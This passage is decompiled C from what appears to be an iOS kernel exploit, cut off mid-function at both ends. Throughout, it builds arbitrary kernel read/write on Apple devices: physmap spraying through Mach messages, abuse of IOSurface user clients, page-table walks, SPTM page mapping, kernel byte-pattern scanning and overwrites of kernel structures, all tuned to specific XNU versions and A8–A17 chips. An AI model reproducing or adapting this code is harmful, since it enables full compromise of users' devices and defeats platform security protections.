        *(__int128 *)&outputStruct[0].msgh_local_port = xmmword_42EC0;
        outputStruct[1].msgh_voucher_port = *(uint64_t *)(v4 + 11304);
        *(uint64_t *)&outputStruct[1].msgh_size = *(uint64_t *)(v4 + 11296);
        outputStruct[0].msgh_remote_port = v77;
        outputStruct[1].msgh_local_port = 16777472;
        v78 = mach_msg(outputStruct, 262161, 0x2Cu, 0, 0, 0, 0);
        if ( v78 )
        {
          v10 = v78 | 0x80000000;
          goto LABEL_196;
        }
        v74 = *(unsigned int *)(v4 + 12352);
        ++*(uint32_t *)(v4 + 4 * v74 + 12356);
        v79 = *(unsigned int *)kobject;
        if ( (uint32_t)v79 )
        {
          v80 = 0;
          v81 = (vm_size_t)theDicta + 4 * vm_page_size;
          v82 = v282 - 4 * vm_page_size;
          v83 = *__handle;
          do
          {
            v84 = 1LL << v80;
            if ( ((1LL << v80) & *(uint64_t *)&v83) == 0 )
            {
              v85 = (uint64_t *)(*(uint64_t *)v64 + (unsigned int)((uint32_t)v80 << v73));
              if ( *v85 != ((PhysmapLoopState *)v4)->marker )
              {
                v86 = *(uint32_t *)(v5 + 384);
                if ( v72 < v86 )
                {
                  for ( m = v72; m < v86; m += 80 )
                  {
                    v88 = (uint64_t *)((char *)v85 + m);
                    v89 = *v88;
                    if ( (unsigned __int64)(*v88 - 1) < 0xFFFEFFFFFFFFFFFFLL )
                      break;
                    if ( (v88[8] & 0xFFF) == 0xCC )
                    {
                      v90 = v88[2];
                      if ( v90 > v81 && v88[3] <= v82 )
                      {
                        v91 = (char *)v85 + (*(uint64_t *)(v5 + 392) & v89);
                        if ( *((uint64_t *)v91 + 3) == v90 )
                        {
                          *(uint64_t *)(v4 + 13408) = v89;
                          *(uint64_t *)(v4 + 13392) = *((uint64_t *)v91 + 1);
                          *(uint64_t *)(v4 + 13384) = v88;
                          *(uint64_t *)(v4 + 13400) = v91;
                          *__handle = (int8x8_t){ .u64 = { v84 | *(uint64_t *)&v83 } };
                          v94 = check_physmap_page_count((uint32_t *)v4, (__int64)v64);
                          if ( (uint32_t)v94 )
                          {
                            v10 = v94;
                            goto LABEL_196;
                          }
                          v283 = *(unsigned int *)(v4 + 12352);
                          if ( (v283 & 0x80000000) != 0 )
                          {
LABEL_184:
                            v98 = 0;
LABEL_188:
                            v102 = 1;
                          }
                          else
                          {
                            theDictb = *(CFMutableDictionaryRef *)(v4 + 13384);
                            while ( 1 )
                            {
                              v95 = v4 + 4 * v283;
                              if ( *(uint32_t *)(v95 + 12356) )
                                break;
LABEL_182:
                              v226 = v283-- <= 0;
                              if ( v226 )
                                goto LABEL_184;
                            }
                            __handlea = (uint32_t *)(v95 + 12356);
                            kobject = v95 + 11328;
                            while ( 1 )
                            {
                              v96 = *(uint32_t *)kobject;
                              LODWORD(v323) = 0;
                              memset(outputStruct, 0, sizeof(outputStruct));
                              v97 = mach_msg(outputStruct, 2, 0, 0x34u, v96, 0, 0);
                              if ( v97 )
                              {
                                v98 = v97 | 0x80000000;
                                goto LABEL_188;
                              }
                              v98 = 163885;
                              if ( (outputStruct[0].msgh_bits & 0x80000000) == 0 )
                                goto LABEL_187;
                              if ( outputStruct[1].msgh_bits != 1 )
                                goto LABEL_187;
                              v98 = 163886;
                              if ( HIBYTE(outputStruct[1].msgh_local_port) != 1 )
                                goto LABEL_187;
                              v99 = *(uint64_t *)&outputStruct[1].msgh_size;
                              if ( !*(uint64_t *)&outputStruct[1].msgh_size )
                                goto LABEL_187;
                              msgh_voucher_port = outputStruct[1].msgh_voucher_port;
                              if ( !outputStruct[1].msgh_voucher_port )
                              {
                                v98 = 163886;
LABEL_187:
                                mach_msg_destroy(outputStruct);
                                goto LABEL_188;
                              }
                              *(uint64_t *)&outputStruct[1].msgh_size = 0;
                              outputStruct[1].msgh_voucher_port = 0;
                              mach_msg_destroy(outputStruct);
                              v101 = *((uint64_t *)theDictb + 2);
                              --*__handlea;
                              if ( v101 >= v99 && v101 < msgh_voucher_port + v99 )
                                break;
                              vm_deallocate(mach_task_self_, v99, msgh_voucher_port);
                              if ( !*__handlea )
                                goto LABEL_182;
                            }
                            v102 = 0;
                            v98 = 0;
                            *(uint64_t *)(v4 + 11312) = v99;
                            *(uint64_t *)(v4 + 11320) = msgh_voucher_port;
                          }
                          if ( ((unsigned __int8)v102 & (v98 == 0)) != 0 )
                            v10 = 708625;
                          else
                            v10 = v98;
                          if ( (uint32_t)v10 != 708625 )
                          {
                            if ( !(uint32_t)v10 )
                              *(uint64_t *)(v4 + 11288) = v304;
                            goto LABEL_196;
                          }
                          goto LABEL_128;
                        }
                      }
                    }
                  }
                }
                *(uint64_t *)&v83 |= v84;
                *__handle = v83;
              }
            }
            ++v80;
          }
          while ( v80 != v79 );
        }
        else
        {
          v83 = *__handle;
        }
        v92 = (uint8x8_t)vcnt_s8(v83);
        v92.i16[0] = vaddlv_u8(v92);
      }
      while ( (uint32_t)v79 != v92.i32[0] );
      v93 = check_physmap_page_count((uint32_t *)v4, (__int64)v64);
      if ( v93 )
        v69 = 40;
      else
        v69 = 41;
      if ( v93 )
        v10 = v93;
      else
        v10 = 708625;
LABEL_129:
      if ( v69 == 40 )
        goto LABEL_196;
      v257 = v62++ >= 0xF;
      if ( v257 )
        goto LABEL_196;
      continue;
    }
    break;
  }
  v10 = 708609;
LABEL_196:
  v103 = *(uint32_t *)(v4 + 13440);
  if ( v103 )
  {
    v104 = 0;
    v105 = *(uint64_t *)(v4 + 13432);
    do
    {
      v106 = *(uint32_t *)(v105 + 4 * v104);
      if ( v106 + 1 >= 2 )
      {
        mach_port_deallocate(mach_task_self_, v106);
        v105 = *(uint64_t *)(v4 + 13432);
        *(uint32_t *)(v105 + 4 * v104) = 0;
        v103 = *(uint32_t *)(v4 + 13440);
      }
      ++v104;
    }
    while ( v104 < v103 );
  }
  v107 = 0;
  v24 = v4 + 13480;
  do
  {
    v108 = *(uint32_t *)(v24 + v107);
    if ( v108 + 1 >= 2 )
    {
      mach_port_mod_refs(mach_task_self_, v108, 1u, -1);
      *(uint32_t *)(v24 + v107) = 0;
    }
    v107 += 4;
  }
  while ( v107 != 64 );
LABEL_205:
  if ( (uint32_t)v10 )
    return v10;
  *(uint64_t *)(v5 + 80) = v4;
  *(uint64_t *)(v5 + 48) = ioconnect_kread_physmap;
  addr_v24 = *(uint64_t *)(v4 + 11280);
LABEL_207:
  v305 = 163855;
  v10 = 163878;
  if ( !validate_kaddr_range(v5, addr_v24) )
    return v10;
  v109 = kreadptr(krwCtx, addr_v24);
  if ( !v109 )
    return v10;
  *(uint64_t *)(v5 + 416) = v109;
  v110 = mach_host_self();
  ipc_port = task_self_get_ipc_port(krwCtx, v110);
  if ( !ipc_port )
    return 163854;
  *(uint64_t *)(v5 + 424) = ipc_port;
  v112 = 24;
  if ( *(int *)(v5 + 320) <= 8791 )
    v113 = 24;
  else
    v113 = 16;
  if ( *(int *)(v5 + 320) <= 8791 )
    v114 = 104;
  else
    v114 = 96;
  if ( *(int *)(v5 + 320) <= 8791 )
    v112 = 16;
  v295 = v112;
  v115 = read_kaddr_at_task_offset(krwCtx, addr_v24);
  if ( !v115 )
    return 163878;
  if ( !kread_physmap_decorated(krwCtx, v113 + v115, (unsigned __int64 *)&outputStruct[0].msgh_bits) )
    return v305;
  v116 = *(uint64_t *)&outputStruct[0].msgh_bits;
  if ( !*(uint64_t *)&outputStruct[0].msgh_bits )
    return 708625;
  LODWORD(v10) = 708625;
  while ( 1 )
  {
    if ( !validate_kaddr_range(v5, v116) )
      goto LABEL_246;
    if ( !kread_u32(v5, *(uint64_t *)&outputStruct[0].msgh_bits + v114, a1) )
      goto LABEL_245;
    if ( a1[0] )
    {
      v117 = *(uint64_t *)&outputStruct[0].msgh_bits;
      goto LABEL_228;
    }
    if ( !kread_physmap_decorated(
            krwCtx,
            *(uint64_t *)&outputStruct[0].msgh_bits + v113,
            (unsigned __int64 *)&name.msgh_bits) )
      goto LABEL_245;
    v117 = *(uint64_t *)&outputStruct[0].msgh_bits;
    if ( *(uint64_t *)&outputStruct[0].msgh_bits == *(uint64_t *)&name.msgh_bits )
      break;
LABEL_228:
    v118 = kread_physmap_decorated(krwCtx, v117 + v113, (unsigned __int64 *)&outputStruct[0].msgh_bits);
    if ( v118 )
      v10 = (unsigned int)v10;
    else
      v10 = 163855;
    if ( v118 )
    {
      v116 = *(uint64_t *)&outputStruct[0].msgh_bits;
      if ( *(uint64_t *)&outputStruct[0].msgh_bits )
        continue;
    }
    goto LABEL_247;
  }
  if ( !kread_physmap_decorated(
          krwCtx,
          *(uint64_t *)&outputStruct[0].msgh_bits + v295,
          (unsigned __int64 *)&name.msgh_bits) )
    goto LABEL_245;
  if ( !validate_kaddr_range(v5, *(__int64 *)&name.msgh_bits) )
    goto LABEL_246;
  if ( *(int *)(v5 + 320) < 8792 )
  {
LABEL_244:
    v10 = 0;
    v24 = *(uint64_t *)&name.msgh_bits;
    goto LABEL_247;
  }
  if ( kread_physmap_decorated(krwCtx, *(uint64_t *)&name.msgh_bits + 8LL, (unsigned __int64 *)&name.msgh_bits) )
  {
    if ( validate_kaddr_range(v5, *(__int64 *)&name.msgh_bits) )
      goto LABEL_244;
LABEL_246:
    v10 = 163878;
  }
  else
  {
LABEL_245:
    v10 = 163855;
  }
LABEL_247:
  if ( (uint32_t)v10 )
    return v10;
  *(uint64_t *)(v5 + 6616) = v24;
  v10 = check_iogpu_krw_ready_type2(krwCtx, 0, *(uint64_t *)(v5 + 424), (unsigned __int64 *)(v5 + 6608));
  if ( (uint32_t)v10 )
    return v10;
  v10 = init_pgtable_walk_ctx(v5, 0);
  if ( (uint32_t)v10 )
    return v10;
  v120 = *(uint64_t *)(v5 + 344);
  if ( v120 > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) )
  {
    if ( (*(uint8_t *)v5 & 0x20) != 0 )
    {
      v10 = free_iogpu_krw_ctx(krwCtx);
      if ( (uint32_t)v10 )
        return v10;
      v10 = krw_read_validation(krwCtx, 0);
      if ( (uint32_t)v10 )
        return v10;
      *(uint64_t *)(v5 + 48) = 0;
      v10 = krw_write_validation(krwCtx);
      if ( (uint32_t)v10 )
        return v10;
      v121 = (uint64_t *)(v5 + 64);
      goto LABEL_256;
    }
    goto LABEL_372;
  }
  if ( v120 > XNU_VERSION_PACKED(8796, 122, 4, 1023, 1023)
    || (v120 >= XNU_VERSION_PACKED(8796, 102, 5, 0, 0) && ((*(uint32_t *)v5 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 || (*(uint32_t *)v5 & 1) != 0)) )
  {
LABEL_372:
    v319[0] = 0;
    v174 = vm_page_size;
    *(uint64_t *)&outputStruct[0].msgh_bits = vm_page_size;
    *(uint64_t *)&name.msgh_bits = 0;
    memory_entry = mach_make_memory_entry(mach_task_self_, (vm_size_t *)&outputStruct[0].msgh_bits, 0, 131075, v319, 0);
    if ( !memory_entry )
    {
      v175 = get_task_kobject_addr(krwCtx, v319[0]);
      v10 = 163878;
      if ( !v175 )
        return v10;
      v176 = v175;
      v177 = kaddr_to_phys_v1(v5, v175);
      if ( !v177 )
        return v10;
      v178 = v177;
      v179 = walk_kaddr_chain_to_target(krwCtx, v176, 0);
      v10 = 163878;
      if ( !v179 )
        return v10;
      v180 = v179;
      __handlec = kaddr_to_phys_v1(v5, v179);
      if ( !__handlec )
        return v10;
      v10 = map_sptm_state_page(v4);
      if ( (uint32_t)v10 )
        return v10;
      v10 = get_physmap_region_ptrs(v5, *(uint64_t *)(v4 + 11288), __handlec & ~*(uint64_t *)(v5 + 392), a1);
      if ( (uint32_t)v10 )
        return v10;
      memory_entry = vm_map(
                       mach_task_self_,
                       (vm_address_t *)&name.msgh_bits,
                       v174,
                       0,
                       1,
                       *(uint32_t *)(v4 + 13552),
                       0,
                       0,
                       3,
                       3,
                       2u);
      if ( !memory_entry )
      {
        v181 = (*(uint64_t *)(v5 + 392) & v180) + *(uint64_t *)&name.msgh_bits;
        v10 = 163893;
        if ( *(uint32_t *)v181 != *(uint32_t *)(v181 + 4) )
          return v10;
        if ( *(uint64_t *)(v181 + 24) != *(uint64_t *)&outputStruct[0].msgh_bits )
          return v10;
        v10 = get_physmap_region_ptrs(v5, v181, 0, 0);
        if ( (uint32_t)v10 )
          return v10;
        *(uint64_t *)(v181 + 24) = -1;
        memory_entry = vm_deallocate(mach_task_self_, *(vm_address_t *)&name.msgh_bits, v174);
        if ( !memory_entry )
        {
          v10 = get_physmap_region_ptrs(v5, *(uint64_t *)(v4 + 11288), v178 & ~*(uint64_t *)(v5 + 392), 0);
          if ( (uint32_t)v10 )
            return v10;
          memory_entry = vm_map(
                           mach_task_self_,
                           (vm_address_t *)&name.msgh_bits,
                           v174,
                           0,
                           1,
                           *(uint32_t *)(v4 + 13552),
                           0,
                           0,
                           3,
                           3,
                           2u);
          if ( !memory_entry )
          {
            v182 = *(uint64_t *)&name.msgh_bits;
            v183 = (*(uint64_t *)(v5 + 392) & v176) + *(uint64_t *)&name.msgh_bits;
            if ( *(uint64_t *)(v183 + 32) != *(uint64_t *)&outputStruct[0].msgh_bits )
              return 163857;
            *(uint64_t *)(v183 + 32) = -1;
            memory_entry = vm_deallocate(mach_task_self_, v182, v174);
            if ( !memory_entry )
            {
              *(uint32_t *)(v5 + 88) = v319[0];
              v10 = krw_read_validation(v5, 0);
              if ( (uint32_t)v10 )
                return v10;
              *(uint64_t *)(v5 + 80) = 0;
              *(uint64_t *)(v5 + 48) = 0;
              v10 = krw_write_validation(krwCtx);
              if ( (uint32_t)v10 )
                return v10;
              goto LABEL_257;
            }
          }
        }
      }
    }
    return memory_entry | 0x80000000;
  }
  v316 = 0;
  v312 = 0;
  v184 = 288;
  if ( *(int *)(v5 + 320) > 8791 )
    v184 = 264;
  theDictd = (CFMutableDictionaryRef)v184;
  v185 = 280;
  if ( *(int *)(v5 + 320) > 8791 )
    v185 = 256;
  v280 = vm_page_size;
  v285 = v185;
  *(__int128 *)a1 = 0u;
  v186 = ioservice_get_matching("IOSurfaceRoot");
  v10 = 163854;
  if ( v186 + 1 < 2 )
    return v10;
  v187 = v186;
  if ( IOServiceOpen(v186, mach_task_self_, 0, (io_connect_t *)a1)
    || (v297 = task_self_get_ipc_port(krwCtx, a1[0])) == 0 )
  {
    v188 = 0;
    v297 = 0;
    v278 = 0;
  }
  else
  {
    v215 = 0;
    while ( 1 )
    {
      kobject = maybe_ipc_port_get_kobject(krwCtx, v297);
      if ( !kobject )
      {
        v188 = 0;
        kobject = 0;
        v278 = 0;
        v10 = 163877;
        goto LABEL_402;
      }
      if ( *(unsigned int *)(v5 + 384) - (*(uint64_t *)(v5 + 392) & kobject) >= 0x200 )
      {
        v10 = 0;
        v188 = a1[v215];
        v278 = 1;
        goto LABEL_402;
      }
      if ( v215 == 7 )
      {
        v188 = 0;
        v278 = 0;
        v10 = 708625;
        goto LABEL_402;
      }
      if ( IOServiceOpen(v187, mach_task_self_, 0, (io_connect_t *)&a1[v215 + 1]) )
        break;
      v216 = task_self_get_ipc_port(krwCtx, a1[++v215]);
      v297 = v216;
      if ( !v216 )
      {
        v188 = 0;
        v297 = 0;
        goto LABEL_482;
      }
    }
    v188 = 0;
LABEL_482:
    v278 = 0;
  }
  v10 = 163854;
LABEL_402:
  for ( n = 0; n != 8; ++n )
  {
    v190 = a1[n];
    if ( v190 + 1 >= 2 && v190 != v188 )
    {
      IOServiceClose(v190);
      a1[n] = 0;
    }
  }
  IOObjectRelease(v187);
  if ( !v278 )
    return v10;
  v273 = (__int64)theDictd + kobject;
  v270 = kobject + v285;
  v192 = 7;
  while ( 2 )
  {
    v279 = v192;
    outputStructCnt = 3936;
    __handled = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", 1);
    if ( !__handled )
      return 110593;
    v193 = (const void **)dlsym(__handled, "kIOSurfaceIsGlobal");
    if ( !v193 )
      goto LABEL_485;
    v194 = *v193;
    if ( !*v193 )
      goto LABEL_485;
    v195 = (const void **)dlsym(__handled, "kIOSurfaceWidth");
    if ( !v195 )
      goto LABEL_485;
    v196 = *v195;
    if ( !*v195 )
      goto LABEL_485;
    v197 = (const void **)dlsym(__handled, "kIOSurfaceHeight");
    if ( !v197 )
      goto LABEL_485;
    v198 = *v197;
    if ( !*v197 )
      goto LABEL_485;
    theDicte = CFDictionaryCreateMutable(0, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if ( !theDicte )
    {
      v6 = 708617;
LABEL_485:
      dlclose(__handled);
      return v6;
    }
    CFDictionarySetValue(theDicte, v194, kCFBooleanFalse);
    cfdict_set_int32(theDicte, v196);
    cfdict_set_int32(theDicte, v198);
    v199 = IOCFSerialize(theDicte, 1u);
    if ( v199 )
    {
      v200 = v199;
      v201 = *(uint32_t *)(v5 + 320);
      if ( v201 >= 8792 )
      {
        outputStructCnt = 2664;
        goto LABEL_427;
      }
      if ( v201 < 8019 )
      {
        v203 = 0;
        v202 = 0;
      }
      else
      {
LABEL_427:
        *(uint64_t *)v319 = 0;
        v202 = 1;
        v203 = v319;
      }
      BytePtr = CFDataGetBytePtr(v199);
      Length = CFDataGetLength(v200);
      if ( IOConnectCallMethod(
             v188,
             0,
             (const uint64_t *)v203,
             v202,
             BytePtr,
             Length,
             0,
             0,
             outputStruct,
             &outputStructCnt) )
      {
        v10 = 4097;
      }
      else
      {
        v206 = v285;
        if ( outputStruct[1].msgh_bits < 0x10000 )
          v206 = outputStruct[1].msgh_bits;
        LODWORD(v285) = v206;
        if ( outputStruct[1].msgh_bits >= 0x10000 )
          v10 = 163857;
        else
          v10 = 0;
      }
      CFRelease(v200);
    }
    else
    {
      v10 = 708617;
    }
    CFRelease(theDicte);
    dlclose(__handled);
    if ( (uint32_t)v10 )
      return v10;
    if ( !(unsigned int)krw_read_thunk(krwCtx, v273, 8, &v313) )
      return 163855;
    if ( v313 <= (unsigned int)v285 )
      return 163857;
    if ( !kread_physmap_decorated(krwCtx, v270, (unsigned __int64 *)&v317) )
      return 163855;
    if ( !validate_kaddr_range(v5, v317) )
      return 163878;
    if ( !kread_physmap_decorated(krwCtx, v317 + (unsigned int)(8 * v285), (unsigned __int64 *)&v316) )
      return 163855;
    if ( !validate_kaddr_range(v5, v316) )
      return 163878;
    if ( !kread_physmap_decorated(krwCtx, v316 + 64, (unsigned __int64 *)&v315) )
      return 163855;
    if ( !validate_kaddr_range(v5, v315) )
      return 163878;
    v207 = *(uint64_t *)(v5 + 392);
    v208 = v207 & v315;
    if ( *(unsigned int *)(v5 + 384) - (v207 & (unsigned __int64)v315) <= 0x4FF )
    {
      v192 = v279 - 1;
      if ( v279 )
        continue;
    }
    break;
  }
  v311 = 0;
  v209 = pgtable_walk_wrapper(v5, v315 & ~v207, &name);
  v10 = 163878;
  if ( !v209 )
    return v10;
  __handlee = v311;
  v210 = *(uint64_t *)(v5 + 392);
  v211 = pgtable_walk_wrapper(v5, kobject & ~v210, &name);
  if ( !v211 )
    return v10;
  v212 = v311;
  v10 = map_sptm_state_page(v4);
  if ( (uint32_t)v10 )
    return v10;
  v10 = iokit_kwrite_via_port(
          krwCtx,
          *(uint64_t *)(v4 + 11288),
          *(uint64_t *)(v4 + 13560),
          0,
          *(uint64_t *)(v4 + 11288) + 192LL,
          *(uint64_t *)(v4 + 13560) + 192LL,
          v212 & 0xFFFFFFFFC000LL);
  if ( (uint32_t)v10 )
    return v10;
  memory_entry = vm_map(mach_task_self_, &v312, v280, 0, 1, *(uint32_t *)(v4 + 13552), 0, 0, 3, 3, 2u);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  v213 = v312 + (v210 & kobject);
  v10 = 163857;
  if ( *(uint64_t *)(v213 + 88) || *(uint8_t *)(v213 + 153) )
    return v10;
  if ( !validate_kaddr_range(v5, *(uint64_t *)(v213 + 136)) )
    return 163878;
  *(uint64_t *)(v213 + 136) = kobject + 80;
  *(uint8_t *)(v213 + 153) = 64;
  memory_entry = vm_deallocate(mach_task_self_, v312, v280);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  v10 = iokit_kwrite_via_port(
          krwCtx,
          *(uint64_t *)(v4 + 11288),
          *(uint64_t *)(v4 + 13560),
          1,
          *(uint64_t *)(v4 + 11288) + 192LL,
          *(uint64_t *)(v4 + 13560) + 192LL,
          __handlee & 0xFFFFFFFFC000LL);
  if ( (uint32_t)v10 )
    return v10;
  memory_entry = vm_map(mach_task_self_, &v312, v280, 0, 1, *(uint32_t *)(v4 + 13552), 0, 0, 3, 3, 2u);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  *(uint32_t *)(v5 + 232) = v188;
  v214 = v312;
  *(uint64_t *)(v5 + 240) = v315;
  *(uint64_t *)(v5 + 248) = v214;
  *(uint64_t *)(v5 + 256) = v280;
  *(uint64_t *)(v5 + 264) = v208;
  *(uint32_t *)(v5 + 272) = v285;
  *(uint32_t *)(v5 + 276) = *(uint32_t *)(v4 + 13552);
  *(uint32_t *)(v4 + 13552) = 0;
  v10 = 163841;
  if ( v188 + 1 < 2 || !v214 || !v280 )
    return v10;
  if ( !(unsigned int)kread_modify_u32_with_delta(krwCtx, v297, 16) )
    return 163856;
  *(uint64_t *)(v5 + 80) = 0;
  v121 = (uint64_t *)(v5 + 48);
LABEL_256:
  *v121 = 0;
LABEL_257:
  v122 = *(uint64_t *)(v5 + 424);
  if ( !v122 )
    return 163848;
  if ( !kread_u32(v5, v122, outputStruct) || (outputStruct[0].msgh_bits & 0x3FF) - 3 >= 2 )
    return v305;
  PhysmapLoopState *physmapState = (PhysmapLoopState *)v4;
  v123 = physmapState->retainedWorkerMemoryEntryCount;
  if ( !v123 )
  {
LABEL_270:
    v10 = 0;
    goto LABEL_271;
  }
  v124 = 0;
  v125 = (__int64)physmapState->retainedWorkerMemoryEntries;
  while ( 2 )
  {
    v126 = *(uint32_t *)(v125 + 4 * v124);
    if ( v126 + 1 < 2 )
    {
LABEL_269:
      if ( ++v124 >= (unsigned __int64)v123 )
        goto LABEL_270;
      continue;
    }
    break;
  }
  v127 = get_task_kobject_addr(krwCtx, *(uint32_t *)(v125 + 4 * v124));
  if ( !v127 )
  {
    v10 = 163848;
    goto LABEL_271;
  }
  v128 = walk_kaddr_chain_to_target(krwCtx, v127, 1);
  if ( !v128 )
  {
    v10 = 163878;
    goto LABEL_271;
  }
  v129 = v128 + 56;
  if ( !kread64_internal(krwCtx, v128 + 56, (uint64_t *)outputStruct) )
  {
    v10 = 163855;
    goto LABEL_271;
  }
  if ( !*(uint64_t *)&outputStruct[0].msgh_bits || kwrite_physmap_with_a3_ptr(v5, v129, 0) )
  {
    mach_port_deallocate(mach_task_self_, v126);
    *(uint32_t *)(v125 + 4 * v124) = 0;
    v123 = physmapState->retainedWorkerMemoryEntryCount;
    goto LABEL_269;
  }
  v10 = 163856;
LABEL_271:
  v130 = 0;
  physmapState->retainedWorkerMemoryEntryCount = 0;
  __handleb = (char *)physmap_read_result_at(v4, 0)->workerScratchPages;
  v131 = (__int64)physmap_read_result_at(v4, 0)->backupMappings;
  while ( 2 )
  {
    PhysmapReadResult *cleanupResult = physmap_read_result_at(v4, v130);
    theDictc = (CFMutableDictionaryRef)cleanupResult;
    v293 = cleanupResult->mapping;
    if ( cleanupResult->mapping )
    {
      v296 = cleanupResult->mappedSize;
      if ( v296 )
      {
        v132 = (__int64)cleanupResult - 16;
        v272 = cleanupResult->retainedMappingEntry;
        v284 = cleanupResult->requestedSize;
        if ( *(uint32_t *)v4 == 3 )
        {
          v133 = cleanupResult->memoryEntry;
          if ( v133 + 1 >= 2 )
          {
            v136 = get_task_kobject_addr(krwCtx, v133);
            if ( !v136 )
            {
              v10 = 163848;
              break;
            }
            v137 = walk_kaddr_chain_to_target(krwCtx, v136, 1);
            if ( !v137 )
            {
LABEL_488:
              v10 = 163878;
              break;
            }
            v138 = v137 + 56;
            if ( !kread64_internal(krwCtx, v137 + 56, (uint64_t *)outputStruct) )
            {
LABEL_487:
              v10 = 163855;
              break;
            }
            if ( *(uint64_t *)&outputStruct[0].msgh_bits && !kwrite_physmap_with_a3_ptr(v5, v138, 0) )
            {
LABEL_370:
              v10 = 163856;
              break;
            }
          }
          else
          {
            v134 = traverse_sptm_pgtable_chain(krwCtx, mach_task_self_, v293);
            if ( !v134 )
            {
              v10 = 163857;
              break;
            }
            v135 = v134 + 56;
            if ( !kread64_internal(krwCtx, v134 + 56, (uint64_t *)outputStruct) )
              goto LABEL_487;
            if ( *(uint64_t *)&outputStruct[0].msgh_bits && !kwrite_physmap_with_a3_ptr(v5, v135, 0) )
              goto LABEL_370;
            if ( v284 )
              *(uint32_t *)(v284 + v293) = 0;
          }
        }
        if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
        {
          outputStructCnt = 0;
          has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A8);
          if ( has_flag )
          {
            v265 = 0xFFFFFFFFF000LL;
            v267 = 4095;
            v277 = 4096;
          }
          else
          {
            v277 = *(unsigned int *)(v5 + 384);
            v265 = 0xFFFFFFFFC000LL;
            v267 = *(uint64_t *)(v5 + 392);
          }
          v151 = *(uint64_t *)(v4 + 13568);
          if ( v151 && *(uint64_t *)(v4 + 13576) )
          {
            *(uint64_t *)v319 = *(uint64_t *)(v4 + 13576);
            *(uint64_t *)a1 = v151;
          }
          else
          {
            resolve_kernel_text_range(&name, krwCtx);
            outputStruct[0] = name;
            if ( has_flag )
              v152 = "29 01 00 8A .. .. .. .. .. .. .. .. 29 01 0A CB";
            else
              v152 = "08 7C 72 92 .. .. .. .. .. .. .. .. 08 01 09 CB";
            v153 = kernel_pattern_scan((__int64)&name, v152, 0);
            if ( !v153 )
              goto LABEL_499;
            v154 = find_kernel_func(*(__int64 **)(v5 + 6648), (__int64 *)(v153 + 4));
            *(uint64_t *)a1 = v154;
            if ( !v154 )
              goto LABEL_499;
            if ( !kread64_internal(krwCtx, v154, (uint64_t *)a1) )
              goto LABEL_495;
            if ( !*(uint64_t *)a1
              || (v155 = find_kernel_func(*(__int64 **)(v5 + 6648), (__int64 *)(v153 + 20)), (*(uint64_t *)v319 = v155) == 0) )
            {
              v6 = 163878;
              goto LABEL_499;
            }
            if ( !kread_physmap_decorated(krwCtx, v155, (unsigned __int64 *)v319) )
            {
LABEL_495:
              v6 = 163855;
LABEL_499:
              v10 = v6;
              break;
            }
            if ( !validate_kaddr_range(v5, *(__int64 *)v319) )
            {
              v6 = 163878;
              goto LABEL_499;
            }
            *(uint64_t *)(v4 + 13568) = *(uint64_t *)a1;
            *(uint64_t *)(v4 + 13576) = *(uint64_t *)v319;
          }
          if ( v284 )
          {
            v156 = 0;
            v263 = 0;
            v157 = 0;
            do
            {
              if ( v157 && (v157 & (unsigned __int64)v267) + 8 < v277 )
              {
                v157 += 8;
                if ( !(unsigned int)krw_read_thunk(krwCtx, v157, 8, &v317) )
                  goto LABEL_487;
                v158 = v317;
              }
              else
              {
                *(uint64_t *)&outputStruct[0].msgh_bits = 0;
                *(uint64_t *)&name.msgh_bits = 0;
                v159 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A8);
                v160 = 0xFFFFFFFFF000LL;
                if ( !v159 )
                  v160 = 0xFFFFFFFFC000LL;
                v269 = v160;
                v161 = task_struct_field_kread(krwCtx, mach_task_self_);
                if ( !v161 )
                  goto LABEL_488;
                if ( !kread_physmap_decorated(krwCtx, v161, (unsigned __int64 *)&outputStruct[0].msgh_bits) )
                  goto LABEL_487;
                if ( (!*(uint64_t *)(v5 + 6256) || !*(uint64_t *)(v5 + 6264)) && !(unsigned int)init_kread_pattern_addrs((uint64_t *)v5) )
                {
                  v10 = 163843;
                  goto LABEL_500;
                }
                valuea = v293 + v156;
                v162 = *(uint64_t *)&outputStruct[0].msgh_bits;
                if ( v159 )
                {
                  v163 = valuea >> 30;
                  v164 = 255;
                }
                else
                {
                  v165 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK | KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER);
                  v163 = 2047;
                  if ( !v165 )
                    v163 = 7;
                  v164 = valuea >> 36;
                }
                if ( !(unsigned int)krw_read_thunk(krwCtx, v162 + 8 * (v163 & v164), 8, &name) )
                  goto LABEL_487;
                if ( (~LOBYTE(name.msgh_bits) & 3) != 0 )
                  goto LABEL_363;
                v166 = translate_physmap_addr_via_segments(v5, *(uint64_t *)(v5 + 6256), *(uint64_t *)(v5 + 6264), *(uint64_t *)&name.msgh_bits & v269);
                if ( !v166 )
                  goto LABEL_488;
                v167 = (valuea >> 21) & 0x1FF;
                if ( !v159 )
                  v167 = (valuea >> 25) & 0x7FF;
                if ( !(unsigned int)krw_read_thunk(krwCtx, v166 + 8 * v167, 8, &name) )
                  goto LABEL_487;
                if ( (~LOBYTE(name.msgh_bits) & 3) != 0 )
                {
LABEL_363:
                  v157 = 0;
                  goto LABEL_364;
                }
                v263 = *(uint64_t *)&name.msgh_bits & v269;
                v168 = translate_physmap_addr_via_segments(v5, *(uint64_t *)(v5 + 6256), *(uint64_t *)(v5 + 6264), *(uint64_t *)&name.msgh_bits & v269);
                if ( !v168 )
                  goto LABEL_488;
                v169 = (valuea >> 12) & 0x1FF;
                if ( !v159 )
                  v169 = (valuea >> 14) & 0x7FF;
                v157 = v168 + 8 * v169;
                if ( !(unsigned int)krw_read_thunk(krwCtx, v157, 8, &name) )
                  goto LABEL_487;
                v158 = *(uint64_t *)&name.msgh_bits;
                v317 = *(uint64_t *)&name.msgh_bits;
              }
              if ( !v158 )
                goto LABEL_364;
              v170 = v158 & v265;
              if ( !v170 )
                goto LABEL_364;
